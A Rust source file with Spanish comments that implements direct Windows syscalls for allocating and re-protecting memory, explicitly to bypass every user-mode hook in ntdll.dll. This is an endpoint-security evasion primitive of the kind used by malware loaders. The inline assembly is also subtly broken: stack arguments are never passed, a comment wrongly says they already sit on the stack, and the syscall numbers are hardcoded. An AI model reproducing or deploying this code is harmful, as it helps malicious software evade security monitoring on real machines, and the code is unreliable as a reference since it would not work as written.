// Direct Syscalls - Bypass completo de hooks en user-mode
// Ejecuta syscalls directamente sin pasar por ntdll.dll

use std::arch::asm;
use winapi::shared::ntdef::{NTSTATUS, HANDLE, PVOID};

/// Syscall numbers para Windows 10/11 (x64)
/// Estos números cambian entre versiones de Windows
#[repr(u32)]
#[derive(Debug, Clone, Copy)]
pub enum SyscallNumber {
    NtAllocateVirtualMemory = 0x18,
    NtProtectVirtualMemory = 0x50,
}

/// Ejecuta NtAllocateVirtualMemory via syscall directo
/// Bypasses TODOS los hooks en ntdll.dll
#[cfg(target_arch = "x86_64")]
#[inline(never)]  // IMPORTANTE: Evitar que el compilador inline esto
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    let syscall_num = SyscallNumber::NtAllocateVirtualMemory as u32;
    let mut status: i32;

    // Direct syscall usando inline assembly
    // Windows x64 calling convention: rcx, rdx, r8, r9, [stack], [stack]
    // Los argumentos 5 y 6 (allocation_type, protect) ya están en el stack
    asm!(
        "mov r10, rcx",           // Backup rcx to r10 (syscall convention)
        "mov eax, {syscall:e}",   // Load syscall number (32-bit)
        "syscall",                // Execute direct syscall
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") zero_bits,
        in("r9") region_size,
        lateout("eax") status,
    );

    status
}

/// Ejecuta NtProtectVirtualMemory via syscall directo
#[cfg(target_arch = "x86_64")]
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS {
    let syscall_num = SyscallNumber::NtProtectVirtualMemory as u32;
    let mut status: i32;

    asm!(
        "mov r10, rcx",
        "mov eax, {syscall:e}",
        "syscall",
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") region_size,
        in("r9") new_protect,
        // old_protect va en el stack
        lateout("eax") status,
        options(nostack)
    );

    status
}
